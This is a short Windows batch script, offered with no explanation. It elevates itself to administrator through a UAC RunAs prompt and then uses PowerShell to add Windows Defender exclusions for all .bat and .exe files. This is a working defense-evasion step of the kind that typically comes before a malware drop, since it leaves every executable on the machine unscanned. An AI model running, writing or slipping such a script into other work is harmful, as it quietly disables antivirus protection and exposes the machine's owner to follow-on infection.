@echo off
@whoami /groups | find "S-1-16-12288" > nul
@if errorlevel 1 PowerShell Start-Process '%0' -Verb RunAs & exit /b
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
pause > nul
